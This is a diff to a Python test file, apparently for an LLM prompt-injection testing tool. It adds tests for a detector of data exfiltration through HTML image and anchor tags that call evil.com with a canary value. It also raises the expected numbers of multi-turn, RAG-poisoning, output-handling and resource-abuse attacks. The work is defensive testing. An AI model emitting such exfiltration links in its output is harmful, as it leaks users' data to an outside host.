@@ -160,6 +160,16 @@ def test_markdown_exfil_respects_allowlist():
     assert d(ctx(output="[a](https://evil.com/p?c=RG-AAAA1111)"))[0] is True
 
 
+def test_markdown_exfil_detects_html_img_and_anchor():
+    d = get_detector("markdown_exfil")
+    assert d(ctx(output='<img src="https://evil.com/p.png?d=RG-AAAA1111">'))[0] is True
+    assert d(ctx(output="<img src=https://evil.com/p.png?x=1>"))[0] is True
+    assert d(ctx(output='See <a href="https://evil.com/log?session=RG-AAAA1111">here</a>'))[0] is True
+    assert d(ctx(output='<img src="https://cdn.good.com/i.png?v=1">', allowed_hosts=["good.com"]))[0] is False
+    assert d(ctx(output='<img src="https://evil.com/p.png">'))[0] is False  # no query/canary
+    assert d(ctx(output='<a href="https://evil.com/p">x</a>'))[0] is False
+
+
 def test_output_length():
     d = get_detector("output_length")
     assert d(ctx(output="a" * 10, args={"max_chars": 5}))[0] is True
@@ -205,9 +215,10 @@ def test_builtin_pi_attacks_have_levels():
     mt = [a for a in attacks if a.family == "multi_turn"]
     assert mt, "expected multi_turn attacks"
     mt_by_id = {a.id: a for a in mt if "~" not in a.id}
-    for seed in ("MT-001", "MT-003", "MT-004", "MT-005"):
+    for seed in ("MT-001", "MT-003", "MT-004", "MT-005", "MT-006", "MT-007", "MT-008", "MT-009", "MT-010"):
         assert mt_by_id[seed].level is not None, seed
     assert mt_by_id["MT-002"].level is None
+    assert mt_by_id["MT-011"].level is None
     for a in mt:
         if "~" in a.id:
             assert a.level == 4, a.id
@@ -241,7 +252,9 @@ def test_rag_and_multi_turn_families_ship_attacks():
     for a in load_builtin_attacks():
         by_fam.setdefault(a.family, []).append(a)
     assert len(by_fam["rag_poisoning"]) >= 5
-    assert len(by_fam["multi_turn"]) >= 5
+    assert len(by_fam["multi_turn"]) >= 10
+    assert len(by_fam["output_handling"]) >= 6
+    assert len(by_fam["resource_abuse"]) >= 5
     assert FAMILY_BY_ID["rag_poisoning"].status == FAMILY_STATUS_AVAILABLE
     assert FAMILY_BY_ID["multi_turn"].status == FAMILY_STATUS_AVAILABLE
     for a in by_fam["rag_poisoning"]:
